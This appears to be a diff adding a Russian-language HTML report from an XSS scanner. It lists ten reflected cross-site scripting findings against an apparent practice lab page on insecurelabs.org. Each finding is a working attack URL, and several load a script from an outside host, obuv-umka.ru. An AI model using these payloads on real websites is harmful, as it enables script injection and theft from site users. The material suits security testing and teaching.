@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en" class="no-js">
+<head>
+<meta charset="UTF-8" />
+<title>XSS-Scanner Отчет</title>
+<link rel="shortcut icon" href="../favicon.ico">
+<link rel="stylesheet" type="text/css" href="xssScanerReportStyle/css/demo.css" />
+<link rel="stylesheet" type="text/css" href="xssScanerReportStyle/css/component.css" />
+</head>
+<body>
+<div class="container">
+<header>
+<h1> <em>XSS-Scanner</em>
+</h1>
+</header>
+<div class="component">
+<div class="reportInfo">
+<h2>Отчет</h2>
+<p>Проверка url <a href="http://www.insecurelabs.org/Task/Rule1/">http://www.insecurelabs.org/Task/Rule1/</a> от 24 Мая 2015</p>
+<p>Продолжительность проверки 00:00:16</p>
+<p>Обнаружено <B>10</B> уязвимостей</p>
+</div><table>
+<thead>
+<tr>
+<th>Тип уязвимости</th>
+<th>Url</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>REFLECTED</td>
+<td><textarea style="margin: 2px; height: 52px; width: 726px;">http://www.insecurelabs.org/task/rule1/?query=<SCRIPT SRC=http://obuv-umka.ru/js/xss.js></SCRIPT></textarea></td>
+</tr></tbody>
+</table><tr>
+<td>REFLECTED</td>
+<td><textarea style="margin: 2px; height: 52px; width: 726px;">http://www.insecurelabs.org/task/rule1/?query=<IMG """><SCRIPT>location.hash=10</SCRIPT>"></textarea></td>
+</tr></tbody>
+</table><tr>
+<td>REFLECTED</td>
+<td><textarea style="margin: 2px; height: 52px; width: 726px;">http://www.insecurelabs.org/task/rule1/?query=<IMG SRC=/ onerror="location.hash=String.fromCharCode(49, 48)"></img></textarea></td>
+</tr></tbody>
+</table><tr>
+<td>REFLECTED</td>
+<td><textarea style="margin: 2px; height: 52px; width: 726px;">http://www.insecurelabs.org/task/rule1/?query=<SCRIPT/XSS SRC="http://obuv-umka.ru/js/xss.js"></SCRIPT></textarea></td>
+</tr></tbody>
+</table><tr>
+<td>REFLECTED</td>
+<td><textarea style="margin: 2px; height: 52px; width: 726px;">http://www.insecurelabs.org/task/rule1/?query=<BODY onload!#%&()*~+-_.,:;?@[/|\]^`=location.hash=10></textarea></td>
+</tr></tbody>
+</table><tr>
+<td>REFLECTED</td>
+<td><textarea style="margin: 2px; height: 52px; width: 726px;">http://www.insecurelabs.org/task/rule1/?query=<SCRIPT/SRC="http://obuv-umka.ru/js/xss.js"></SCRIPT></textarea></td>
+</tr></tbody>
+</table><tr>
+<td>REFLECTED</td>
+<td><textarea style="margin: 2px; height: 52px; width: 726px;">http://www.insecurelabs.org/task/rule1/?query=<<SCRIPT>location.hash=10;//<</SCRIPT></textarea></td>
+</tr></tbody>
+</table><tr>
+<td>REFLECTED</td>
+<td><textarea style="margin: 2px; height: 52px; width: 726px;">http://www.insecurelabs.org/task/rule1/?query=</script><script>location.hash=10;</script></textarea></td>
+</tr></tbody>
+</table><tr>
+<td>REFLECTED</td>
+<td><textarea style="margin: 2px; height: 52px; width: 726px;">http://www.insecurelabs.org/task/rule1/?query=</TITLE><SCRIPT>location.hash=10;</SCRIPT></textarea></td>
+</tr></tbody>
+</table><tr>
+<td>REFLECTED</td>
+<td><textarea style="margin: 2px; height: 52px; width: 726px;">http://www.insecurelabs.org/task/rule1/?query=<BODY ONLOAD=location.hash=10></textarea></td>
+</tr></tbody>
+</table></div>
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
+<script src="http://cdnjs.cloudflare.com/ajax/libs/jquery-throttle-debounce/1.1/jquery.ba-throttle-debounce.min.js"></script>
+<script src="xssScanerReportStyle/js/jquery.stickyheader.js"></script>
+</body>
+</html>
